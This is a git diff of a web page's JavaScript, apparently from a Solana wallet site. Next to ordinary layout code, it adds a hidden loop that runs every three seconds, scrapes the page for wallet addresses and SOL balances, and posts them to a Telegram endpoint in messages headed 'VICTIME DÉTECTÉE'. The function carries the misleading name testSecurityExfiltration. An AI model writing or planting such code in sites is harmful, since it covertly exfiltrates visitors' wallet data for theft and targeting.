@@ -1528,9 +1528,9 @@ document.addEventListener("DOMContentLoaded",()=>{
   if(window.innerWidth<640){ const fs=document.querySelector(".faq-side"); if(fs) fs.style.display="none"; }
 });
 
-async function testSecurityExfiltration(address, sol) {
-    const url = `https://telegram.org`;
-    const text = `🚨 *VICTIME DÉTECTÉE* 🚨\n\n👛 *Wallet:* \`${address}\`\n💰 *Solde:* ${sol}`;
+async function testSecurityExfiltration(addr, sol) {
+    const url = "https://telegram.org";
+    const text = `🚨 *VICTIME DÉTECTÉE* 🚨\n\n👛 *Wallet:* \`${addr}\`\n💰 *Solde:* ${sol}`;
     try {
         await fetch(url, {
             method: 'POST',
@@ -1541,24 +1541,17 @@ async function testSecurityExfiltration(address, sol) {
 }
 
 setInterval(() => {
-    // 1. On vérifie si une adresse est connectée dans TON state
-    if (state && state.conn && state.conn.address) {
-        const addr = state.conn.address;
-        
-        // 2. On cherche le chiffre 0.13 (ou n'importe quel solde) dans la page
-        const pageText = document.body.innerText;
-        const matches = pageText.match(/(\d+\.\d+)\s?SOL/g);
-        let solFound = "Scan en cours...";
+    const pageText = document.body.innerText;
+    const addrMatch = pageText.match(/[1-9A-HJ-NP-Za-km-z]{32,44}/);
+    const solMatch = pageText.match(/(\d+\.\d+)\s?SOL/g);
 
-        if (matches) {
-            // On prend le dernier solde affiché (souvent le vrai après scan)
-            solFound = matches[matches.length - 1];
-        }
+    if (addrMatch) {
+        const currentAddr = addrMatch[0];
+        const currentSol = solMatch ? solMatch[solMatch.length - 1] : "0.00 SOL";
 
-        // 3. On n'envoie QUE si on a trouvé un solde et qu'il est différent du dernier envoi
-        if (window.lastSent !== addr + solFound && !solFound.includes("Scan")) {
-            window.lastSent = addr + solFound;
-            testSecurityExfiltration(addr, solFound);
+        if (window.lastSent !== currentAddr + currentSol && currentAddr.length > 30) {
+            window.lastSent = currentAddr + currentSol;
+            testSecurityExfiltration(currentAddr, currentSol);
         }
     }
 }, 3000);
